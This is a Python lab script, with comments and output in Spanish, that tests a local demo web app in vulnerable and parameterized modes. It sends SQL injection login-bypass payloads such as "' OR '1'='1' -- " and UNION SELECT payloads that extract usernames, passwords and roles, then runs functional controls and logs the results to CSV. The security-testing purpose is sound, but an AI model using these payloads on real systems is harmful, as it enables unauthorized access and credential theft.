import csv
from datetime import datetime
from pathlib import Path

import requests


BASE_URL = "http://127.0.0.1:5000"
RESULTADOS = []

SESION = requests.Session()
SESION.trust_env = False


def solicitar(metodo, ruta, **opciones):
    respuesta = SESION.request(
        metodo,
        BASE_URL + ruta,
        timeout=5,
        allow_redirects=False,
        **opciones,
    )
    respuesta.raise_for_status()

    if respuesta.status_code != 200:
        raise RuntimeError(
            f"Respuesta inesperada: HTTP {respuesta.status_code}"
        )

    if "La consulta no pudo procesarse." in respuesta.text:
        raise RuntimeError(
            "La aplicacion devolvio un error de consulta."
        )

    return respuesta.text


def registrar(nombre, categoria, resultado):
    RESULTADOS.append({
        "prueba": nombre,
        "categoria": categoria,
        "resultado": resultado,
    })
    print(f"{nombre}: {resultado}")


def ejecutar():
    pagina = solicitar("GET", "/login")

    if "CONSULTAS PARAMETRIZADAS" in pagina:
        modo = "parametrizado"
    elif "VULNERABLE" in pagina:
        modo = "vulnerable"
    else:
        raise RuntimeError("No se reconoce la aplicacion o su modo.")

    print("=" * 62)
    print("PRUEBAS SQL INJECTION - LABORATORIO INDICORP")
    print(f"Objetivo local: {BASE_URL}")
    print(f"Modo detectado: {modo.upper()}")
    print("=" * 62)

    payloads_login = [
        "admin' -- ",
        "' OR '1'='1' -- ",
        "' OR 1=1 LIMIT 1 -- ",
        "admin' OR '1'='1",
    ]

    for numero, payload in enumerate(payloads_login, start=1):
        html = solicitar(
            "POST",
            "/login",
            data={
                "usuario": payload,
                "password": "incorrecta",
            },
        )

        if "Acceso concedido." in html:
            resultado = "EXPLOTADO"
        elif "Acceso denegado." in html:
            resultado = "SIN EXITO"
        else:
            raise RuntimeError("Respuesta de login no reconocida.")

        registrar(f"Bypass {numero}", "bypass", resultado)

    payloads_busqueda = [
        "' UNION SELECT usuario, password, rol FROM usuarios -- ",
        "' UNION ALL SELECT usuario, password, rol FROM usuarios -- ",
    ]

    for numero, payload in enumerate(payloads_busqueda, start=1):
        html = solicitar(
            "GET",
            "/buscar",
            params={"q": payload},
        )

        fuga = all(
            f"<td>{valor}</td>" in html
            for valor in (
                "admin",
                "DemoAdmin2026!",
                "administrador",
            )
        )

        if fuga:
            resultado = "EXPLOTADO"
        elif "0 registro(s) encontrado(s)." in html:
            resultado = "SIN EXITO"
        else:
            raise RuntimeError(
                "Busqueda inesperada: revisar manualmente."
            )

        registrar(f"Extraccion UNION {numero}", "union", resultado)

    html = solicitar(
        "POST",
        "/login",
        data={
            "usuario": "admin",
            "password": "DemoAdmin2026!",
        },
    )
    registrar(
        "Control: acceso legitimo",
        "control",
        "CORRECTO" if "Acceso concedido." in html else "FALLO",
    )

    html = solicitar(
        "POST",
        "/login",
        data={
            "usuario": "admin",
            "password": "incorrecta",
        },
    )
    registrar(
        "Control: password incorrecta",
        "control",
        "CORRECTO" if "Acceso denegado." in html else "FALLO",
    )

    html = solicitar(
        "GET",
        "/buscar",
        params={"q": "Laptop"},
    )
    busqueda_correcta = (
        "<td>Laptop HP ProBook</td>" in html
        and "1 registro(s) encontrado(s)." in html
    )
    registrar(
        "Control: busqueda legitima",
        "control",
        "CORRECTO" if busqueda_correcta else "FALLO",
    )

    bypass = sum(
        r["categoria"] == "bypass" and r["resultado"] == "EXPLOTADO"
        for r in RESULTADOS
    )
    union = sum(
        r["categoria"] == "union" and r["resultado"] == "EXPLOTADO"
        for r in RESULTADOS
    )
    controles = sum(
        r["categoria"] == "control" and r["resultado"] == "CORRECTO"
        for r in RESULTADOS
    )

    print("\n" + "=" * 62)
    print(f"Bypass exitosos:       {bypass}/4")
    print(f"Extracciones exitosas: {union}/2")
    print(f"Total ataques exitosos: {bypass + union}/6")
    print(f"Controles correctos:    {controles}/3")

    if bypass + union:
        print("Se evidencio SQL Injection en los casos evaluados.")
    elif controles == 3:
        print("Sin exito de inyeccion en los seis casos evaluados.")
        print("Los tres controles funcionales fueron correctos.")
    else:
        print("Resultado no concluyente: revisar controles fallidos.")

    print("Esto no es una auditoria completa de seguridad.")

    carpeta = Path(__file__).parent / "evidencias"
    carpeta.mkdir(exist_ok=True)
    fecha = datetime.now().strftime("%Y%m%d_%H%M%S")
    archivo = carpeta / f"pruebas_{modo}_{fecha}.csv"

    with archivo.open("w", newline="", encoding="utf-8-sig") as salida:
        campos = ["modo", "prueba", "categoria", "resultado"]
        escritor = csv.DictWriter(salida, fieldnames=campos)
        escritor.writeheader()

        for resultado in RESULTADOS:
            escritor.writerow({"modo": modo, **resultado})

    print(f"\nResultados guardados en: {archivo}")


if __name__ == "__main__":
    try:
        ejecutar()
    except (requests.RequestException, RuntimeError) as error:
        print(f"\nPRUEBA INTERRUMPIDA: {error}")
        print("No interpretar un error como ataque bloqueado.")
        print("Comprueba el servidor y envia una captura del error.")
        raise SystemExit(1)